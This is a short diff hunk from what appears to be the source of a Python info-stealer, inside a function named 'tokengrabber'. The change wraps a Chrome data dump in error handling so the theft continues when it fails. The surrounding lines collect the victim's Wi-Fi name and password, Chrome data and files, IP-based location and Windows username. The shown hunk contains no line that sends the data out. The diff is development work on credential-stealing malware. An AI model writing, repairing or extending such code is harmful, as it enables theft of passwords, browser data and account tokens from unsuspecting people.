@@ -286,7 +286,10 @@ def tokengrabber():
 	working_ids = []
 	computer_os = plt.platform()
 	getwifinetwork,getwifipassword = getwifi().split('|')
-	chrome_dump = chrome()
+	try:
+		chrome_dump = chrome()
+	except:
+		chrome_dump = 'Not Available'
 	getchromefile = get_chrome_file()
 	ip,org,loc,city,country,region,googlemap = getip()
 	pc_username = os.getenv("UserName")
